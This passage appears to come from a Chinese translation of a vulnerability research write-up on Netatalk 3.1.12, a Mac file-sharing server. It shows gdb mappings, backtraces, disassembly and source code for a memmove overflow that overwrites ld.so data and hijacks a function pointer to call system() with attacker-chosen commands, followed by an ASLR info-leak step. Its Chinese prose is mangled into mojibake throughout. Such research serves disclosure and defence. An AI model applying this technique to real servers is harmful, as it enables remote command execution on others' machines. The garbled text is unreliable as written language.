      0x7f6c581b9000     0x7f6c581ba000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581ba000     0x7f6c581bb000     0x1000     0x1000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bb000     0x7f6c581bc000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bc000     0x7f6c581bd000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bd000     0x7f6c581be000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581be000     0x7f6c581bf000     0x1000        0x0 /lib/ld-2.28.so
      0x7f6c581bf000     0x7f6c581dd000    0x1e000     0x1000 /lib/ld-2.28.so
      0x7f6c581dd000     0x7f6c581e5000     0x8000    0x1f000 /lib/ld-2.28.so
      0x7f6c581e5000     0x7f6c581e6000     0x1000    0x26000 /lib/ld-2.28.so
      0x7f6c581e6000     0x7f6c581e7000     0x1000    0x27000 /lib/ld-2.28.so
      0x7f6c581e7000     0x7f6c581e8000     0x1000        0x0 
      0x7ffe86f2b000     0x7ffe86f71000    0x46000        0x0 [stack]
      0x7ffe86fb7000     0x7ffe86fba000     0x3000        0x0 [vvar]
      0x7ffe86fba000     0x7ffe86fbc000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
</pre></table></code></div></div><p>è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">memmove()</code>å‡½æ•°æ¥è¦†ç›–ä¸Šè¿°æˆ‘ä»¬æåˆ°çš„åŠ¨æ€åº“ä¸­çš„ä¸€äº›å†…å®¹ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥é€‰æ‹©å“ªä¸ªåŠ¨æ€åº“å‘¢ï¼Ÿ</p><p>é€šè¿‡è°ƒè¯•æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå½“å´©æºƒå‘ç”Ÿæ—¶ï¼Œå¦‚æœæˆ‘ä»¬ç»§ç»­æ‰§è¡Œï¼ŒNetatalkä¸­çš„ä¸€ä¸ªç‰¹æ®Šçš„å¼‚å¸¸å¤„ç†å‡½æ•°ä¼šæ¥å—å¹¶å¤„ç†å½“å‰å¼‚å¸¸ã€‚</p><p>æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è¦†ç›–äº†æ•´ä¸ª<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>çš„<code class="language-plaintext highlighter-rouge">.data</code>æ®µï¼Œå¹¶æœ€ç»ˆè§¦å‘ä¸‹é¢çš„å´©æºƒï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>(remote-gdb) bt
#0  0x00007f423de3eb50 in _dl_open (file=0x7f423dbf0e86 "libgcc_s.so.1", mode=-2147483646, caller_dlopen=0x7f423db771c5 &lt;init+21&gt;, nsid=-2, argc=4, argv=0x7fffa4967cf8, env=0x7fffa4967d20) at dl-open.c:548
#1  0x00007f423dba406d in do_dlopen (Reading in symbols for dl-error.c...done.
ptr=ptr@entry=0x7fffa4966170) at dl-libc.c:96
#2  0x00007f423dba4b2f in __GI__dl_catch_exception (exception=exception@entry=0x7fffa49660f0, operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:196
#3  0x00007f423dba4bbf in __GI__dl_catch_error (objname=objname@entry=0x7fffa4966148, errstring=errstring@entry=0x7fffa4966150, mallocedp=mallocedp@entry=0x7fffa4966147, operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:215
#4  0x00007f423dba4147 in dlerror_run (operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-libc.c:46
#5  0x00007f423dba41d6 in __GI___libc_dlopen_mode (name=name@entry=0x7f423dbf0e86 "libgcc_s.so.1", mode=mode@entry=-2147483646) at dl-libc.c:195
#6  0x00007f423db771c5 in init () at backtrace.c:53
Reading in symbols for pthread_once.c...done.
#7  0x00007f423dc40997 in __pthread_once_slow (once_control=0x7f423dc2ef80 &lt;once&gt;, init_routine=0x7f423db771b0 &lt;init&gt;) at pthread_once.c:116
#8  0x00007f423db77304 in __GI___backtrace (array=&lt;optimised out&gt;, size=&lt;optimised out&gt;) at backtrace.c:106
#9  0x00007f423ddcd6db in netatalk_panic () from symbols/lib64/libatalk.so.18
#10 0x00007f423ddcd902 in ?? () from symbols/lib64/libatalk.so.18
#11 0x00007f423ddcd958 in ?? () from symbols/lib64/libatalk.so.18
Reading in symbols for ../sysdeps/unix/sysv/linux/x86_64/sigaction.c...done.
#12 &lt;signal handler called&gt;
#13 __memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238
#14 0x00007f423dda6fd0 in ad_rebuild_adouble_header_osx () from symbols/lib64/libatalk.so.18
#15 0x00007f423ddaa985 in ?? () from symbols/lib64/libatalk.so.18
#16 0x00007f423ddaaf34 in ?? () from symbols/lib64/libatalk.so.18
#17 0x00007f423ddad7b0 in ?? () from symbols/lib64/libatalk.so.18
#18 0x00007f423ddad9e1 in ?? () from symbols/lib64/libatalk.so.18
#19 0x00007f423ddae56c in ad_open () from symbols/lib64/libatalk.so.18
#20 0x000055cd275c1ea7 in afp_openfork ()
#21 0x000055cd275a386e in afp_over_dsi ()
#22 0x000055cd275c6ba3 in ?? ()
#23 0x000055cd275c68fd in main ()
</pre></table></code></div></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºå´©æºƒåœ¨ä¸€æ¡<code class="language-plaintext highlighter-rouge">call</code>æŒ‡ä»¤ï¼Œåœ¨è¿™æ¡è¿™ä»¤å¤„ï¼Œæˆ‘ä»¬åŒæ—¶æ§åˆ¶äº†è¢«è°ƒç”¨çš„å‡½æ•°åœ°å€ä»¥åŠç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>(remote-gdb) x /i $pc
=&gt; 0x7f423de3eb50 &lt;_dl_open+48&gt;:	call   QWORD PTR [rip+0x16412]        # 0x7f423de54f68 &lt;_rtld_global+3848&gt;
(remote-gdb) x /gx 0x7f423de54f68
0x7f423de54f68 &lt;_rtld_global+3848&gt;:	0x4242424242424242
(remote-gdb) x /s $rdi
0x7f423de54968 &lt;_rtld_global+2312&gt;:	'A' &lt;repeats 35 times&gt;
</pre></table></code></div></div><p>åœ¨IDAä¸­æ£€æŸ¥<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>å¯çŸ¥ï¼Œè¿™æ˜¯ç”±äº<code class="language-plaintext highlighter-rouge">dl_open()</code>å‡½æ•°è°ƒç”¨<code class="language-plaintext highlighter-rouge">_dl_rtld_lock_recursive</code>å‡½æ•°æŒ‡é’ˆå¹¶ä¼ é€’äº†ä¸€ä¸ªæŒ‡å‘<code class="language-plaintext highlighter-rouge">_dl_load_lock</code> lockçš„æŒ‡é’ˆä½œä¸ºå‚æ•°ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">dl_open</span><span class="p">(</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span>
        <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span>
        <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">caller_dlopen</span><span class="p">,</span>
        <span class="n">Lmid_t</span> <span class="n">nsid</span><span class="p">,</span>
        <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">env</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">mode</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">_dl_signal_error</span><span class="p">(</span><span class="mh">0x16</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="s">"invalid mode for dlopen()"</span><span class="p">);</span>
  <span class="n">rtld_local</span><span class="p">.</span><span class="n">_dl_rtld_lock_recursive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rtld_local</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">);</span>
</pre></table></code></div></div><p>å‡½æ•°æŒ‡é’ˆå’Œlockå‚æ•°éƒ½æ˜¯<code class="language-plaintext highlighter-rouge">rtld_local</code>å…¨å±€å˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä½äº<code class="language-plaintext highlighter-rouge">.data</code>æ®µå½“ä¸­ã€‚</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>.data:0000000000028060 ; rtld_global rtld_local
.data:0000000000028060 _rtld_local     dq 0  
</pre></table></code></div></div><p>å› æ­¤ï¼Œå½“æˆ‘ä»¬å¯ä»¥è¦†ç›–<code class="language-plaintext highlighter-rouge">ld.so</code>çš„<code class="language-plaintext highlighter-rouge">.data</code>æ®µæ—¶ï¼Œè°ƒç”¨ä»»æ„çš„åªæœ‰ä¸€ä¸ªå‚æ•°çš„å‡½æ•°æ¥åˆ©ç”¨æ¼æ´æ˜¯ä¸€ä¸ªéå¸¸é€šç”¨çš„åŠæ³•ã€‚</p><p>æ³¨æ„ï¼šè¿™é‡Œè¿˜æœ‰å¦ä¸€ç§ç±»ä¼¼çš„<a href="https://dangokyo.me/2018/01/20/extra-exploitation-technique-1-_dl_open/">æŠ€æœ¯</a>ï¼ˆå°½ç®¡æœ‰ä¸€ç‚¹ä¸åŒï¼‰</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼šé€šè¿‡å°†lockå‚æ•°è¦†ç›–ä¸ºä¸€æ¡shellå‘½ä»¤å¹¶å°†å‡½æ•°æŒ‡é’ˆè¦†ç›–ä¸º<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°çš„åœ°å€æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“äº†æˆ‘ä»¬å·²ç»æ§åˆ¶äº†ä¼ é€’ç»™<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸éœ€è¦å»çŸ¥é“å®ƒåœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚ç„¶è€Œï¼Œç”±äºASLRå¼€å¯ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä¿¡æ¯æ³„éœ²çš„åˆ©ç”¨åŸè¯­æ¥ç»•è¿‡ASLRã€‚</p><h2 id="æ„å»ºä¸€ä¸ªä¿¡æ¯æ³„éœ²åˆ©ç”¨">æ„å»ºä¸€ä¸ªä¿¡æ¯æ³„éœ²åˆ©ç”¨</h2><p>å¦‚æœæˆ‘ä»¬æ£€æŸ¥å…ˆå‰çš„backtraceï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå®é™…ä¸Šå´©æºƒåœ¨äº†<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>å‡½æ•°ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬å‘ç°äº†åœ¨<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°ä¸­å‘ç”Ÿäº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼š</p><ul><li>åŸå§‹çš„AppleDoubleæ–‡ä»¶é€šè¿‡<code class="language-plaintext highlighter-rouge">mmap()</code>å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜<li>å…ˆå‰è®¨è®ºçš„<code class="language-plaintext highlighter-rouge">memmove()</code>è¢«è°ƒç”¨ï¼Œç”¨æ¥ä¸¢å¼ƒFinderInfoéƒ¨åˆ†çš„å†…å®¹<li><code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>å‡½æ•°è¢«è°ƒç”¨<li>è¢«æ˜ å°„çš„æ–‡ä»¶é€šè¿‡<code class="language-plaintext highlighter-rouge">munmap()</code>å‡½æ•°è¢«å–æ¶ˆæ˜ å°„</ul><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_convert_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EC_INIT</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">bool</span> <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">finderlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">);</span>
    <span class="kt">ssize_t</span> <span class="n">origlen</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">in_conversion</span> <span class="o">||</span> <span class="n">finderlen</span> <span class="o">==</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span><span class="p">,</span>
        <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">finderlen</span><span class="p">);</span>

    <span class="n">origlen</span> <span class="o">=</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>

    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">origlen</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"mmap AppleDouble: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>

    <span class="n">ad_setentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">,</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>
    <span class="n">ad_setentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">,</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>

    <span class="n">EC_ZERO_LOG</span><span class="p">(</span> <span class="n">ftruncate</span><span class="p">(</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span>
                           <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span>
                           <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">))</span> <span class="p">);</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">ad_rebuild_adouble_header_osx</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">map</span><span class="p">);</span>
    <span class="n">munmap</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">origlen</span><span class="p">);</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºã€‚è¯¥å‡½æ•°è´Ÿè´£å°†<code class="language-plaintext highlighter-rouge">adouble</code>ç»“æ„ä½“ä¸­çš„å†…å®¹ä»¥AppleDoubleæ ¼å¼å†™å›è¢«æ˜ å°„çš„æ–‡ä»¶åŒºåŸŸï¼Œå› æ­¤å†™å›çš„å†…å®¹å°†ä¿å­˜åœ¨ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸­ã€‚</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_flush.c</span>
<span class="cm">/*!
 * Prepare adbuf buffer from struct adouble for writing on disk
 */</span>
<span class="kt">int</span> <span class="nf">ad_rebuild_adouble_header_osx</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">adbuf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span>       <span class="n">temp</span><span class="p">;</span>
    <span class="kt">uint16_t</span>       <span class="n">nent</span><span class="p">;</span>
    <span class="kt">char</span>           <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_rebuild_adouble_header_osx"</span><span class="p">);</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">adbuf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_magic</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_version</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">AD_FILLER_NETATALK</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">AD_FILLER_NETATALK</span><span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_filler</span> <span class="p">);</span>

    <span class="n">nent</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">ADEID_NUM_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nent</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nent</span> <span class="p">);</span>

    <span class="cm">/* FinderInfo */</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">EID_DISK</span><span class="p">(</span><span class="n">ADEID_FINDERI</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDOFF_FINDERI_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">adbuf</span> <span class="o">+</span> <span class="n">ADEDOFF_FINDERI_OSX</span><span class="p">,</span> <span class="n">ad_entry</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">),</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>

    <span class="cm">/* rfork */</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">EID_DISK</span><span class="p">(</span><span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDOFF_RFORK_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rlen</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="k">return</span> <span class="n">AD_DATASZ_OSX</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨è°ƒè¯•å™¨ä¸­çœ‹ä¸€ä¸‹<code class="language-plaintext highlighter-rouge">memcpy()</code>å‡½æ•°çš„å‚æ•°ï¼Œå¯ä»¥æ³¨æ„åˆ°åŸåœ°å€æ¥è‡ªäºæ ˆä¸Šï¼Œå¹¶ä¸”å·²ç»è¶Šç•Œäº†ï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>memcpy(0x7f423de20032, 0x7fffa499bbba, 32)
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>(gdb) info proc mappings 
...
          Start Addr           End Addr       Size     Offset objfile
      0x7fffa4923000     0x7fffa4969000    0x46000        0x0 [stack]
      0x7fffa49f9000     0x7fffa49fc000     0x3000        0x0 [vvar]
      0x7fffa49fc000     0x7fffa49fe000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
